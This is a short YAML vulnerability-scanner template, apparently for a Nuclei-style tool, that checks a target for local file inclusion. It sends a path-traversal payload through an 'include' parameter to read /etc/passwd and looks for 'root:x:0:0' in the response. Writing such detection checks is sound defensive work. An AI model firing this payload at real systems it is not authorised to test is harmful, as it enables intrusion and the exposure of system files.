id: lfi6-1304
name: 'Traversal in include'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via include'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      include:
        - '../../../../../../../../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
